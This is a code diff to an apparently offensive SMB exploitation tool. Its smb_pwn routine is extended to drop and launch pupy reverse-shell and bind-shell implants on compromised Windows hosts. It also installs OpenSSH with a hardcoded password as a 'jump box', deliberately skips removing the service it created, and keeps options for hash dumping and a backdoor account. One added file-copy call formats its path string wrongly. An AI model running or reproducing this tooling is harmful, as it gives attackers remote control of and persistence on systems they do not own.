@@ -13,6 +13,8 @@ import socket
 import string
 import sys
 import time
+OSSH_VER = 'setupssh-7.9p1-1.exe'
+NMAP_VER = 'nmap-7.70-setup.exe'
 logger.init()
 logging.getLogger().setLevel(logging.INFO)
 '''
@@ -1056,27 +1058,51 @@ def smb_pwn(conn, arch):
             logging.info('No commands in file')
     else:
         logging.info('No commands.txt found!')
-    if os.path.isfile('setupssh-7.9p1-1.exe'):
-        logging.info('Openssh found, dropping')
-        smb_send_file(smbConn,'./setupssh-7.9p1-1.exe','C','/setupssh-7.9p1-1.exe')
-        logging.info('Launching Openssh installer')
-        service_exec(conn, r'cmd /c start c:\setupssh-7.9p1-1.exe /S /password=asdasd /serveronly=1')
-        logging.info('Launching Openssh Done')
-        logging.info('*'*40)
-        logging.info('Enjoy your new jump box')
-        logging.info('*'*40)
-    else:
-        logging.info('Openssh not found')
-    if os.path.isfile('nmap-7.70-setup.exe'):
-        logging.info('NMAP installer found')
-        if os.path.isfile('setupssh-7.9p1-1.exe'):
-            logging.info('Openssh found, sleeping for 20 sec to allow the installer to finish')
-            time.sleep(20)
-        logging.info('Dropping NMAP installer')
-        smb_send_file(smbConn,'./nmap-7.70-setup.exe','C','/nmap-7.70-setup.exe')
-        logging.info('Launching NMAP installer')
-        service_exec(conn, r'cmd /c start c:\nmap-7.70-setup.exe /S')
-        
+    if args.nr:
+        if os.path.isfile('prev.exe'):
+            logging.info('pupy rev found, dropping')
+            smb_send_file(smbConn,'./prev.exe','C','/pr.exe')
+            logging.info('Launching pupy reverse')
+            service_exec(conn, r'cmd /c start c:\pr.exe')
+            logging.info('Launching pupy reverse done')
+        else:
+            logging.info('pupy rev (./prev.exe) not found')
+
+    if args.nB:
+        if os.path.isfile('pbind.exe'):
+            logging.info('pupy bind found, dropping')
+            smb_send_file(smbConn,'./pbind.exe','C','/pb.exe')
+            logging.info('Launching pupy bind')
+            service_exec(conn, r'cmd /c start c:\pb.exe')
+            logging.info('Launching pupy bind done')
+        else:
+            logging.info('pupy bind (./pbind.exe) not found')
+
+    if args.s:
+        if os.path.isfile('%s' % OSSH_VER ):
+            logging.info('Openssh found, dropping')
+            smb_send_file(smbConn,'./%s','C','/%s' % OSSH_VER)
+            logging.info('Launching Openssh installer')
+            service_exec(conn, 'cmd /c start c:\\%s /S /password=asdasd /serveronly=1' % OSSH_VER)
+            logging.info('Launching Openssh done')
+            logging.info('*'*40)
+            logging.info('Enjoy your new jump box')
+            logging.info('*'*40)
+        else:
+            logging.info('Openssh (./%s) not found' % OSSH_VER)
+            
+        if os.path.isfile('%s' % NMAP_VER ):
+            logging.info('NMAP installer found')
+            if os.path.isfile('%s' % OSSH_VER):
+                logging.info('Openssh found, sleeping for 20 sec to allow the installer to finish')
+                time.sleep(20)
+            logging.info('Dropping NMAP installer')
+            smb_send_file(smbConn,'./%s','C','/%s'  % NMAP_VER)
+            logging.info('Launching NMAP installer')
+            service_exec(conn, 'cmd /c start c:\\%s /S' % NMAP_VER)
+            logging.info('Launching NMAP done')
+        else:
+            logging.info('NMAP (./%s) not found' % NMAP_VER)
 
 def smb_send_file(smbConn, localSrc, remoteDrive, remotePath):
     with open(localSrc, 'rb') as fp:
@@ -1129,8 +1155,9 @@ def service_exec(conn, cmd):
                 pass
                 #logging.info(str(e))
             
-           # logging.info('Removing service %s.....' % service_name)
-           # scmr.hRDeleteService(rpcsvc, serviceHandle)
+            #dont clean up
+            #logging.info('Removing service %s.....' % service_name)
+            #scmr.hRDeleteService(rpcsvc, serviceHandle)
             #scmr.hRCloseServiceHandle(rpcsvc, serviceHandle)
     except Exception as e:
         logging.info("ServiceExec Error on: %s" % conn.get_remote_host())
@@ -1148,6 +1175,9 @@ parser.add_argument('-u', help='Username, Default is \'\'', default='')
 parser.add_argument('-p', help='Password', default='')
 parser.add_argument('-d', help='Dump Hashes',action='store_true', default=False)
 parser.add_argument('-b', help='Add backdoor account',action='store_true', default=False)
+parser.add_argument('-s', help='Setup openssh/NMAP',action='store_true', default=False)
+parser.add_argument('-nr', help='Rev pupy connection',action='store_false', default=True)
+parser.add_argument('-nB', help='Bind pupy connection',action='store_false', default=True)
 parser.add_argument('-c', help='Command Shell *broken', action='store_true', default=False)
 args = parser.parse_args()
 
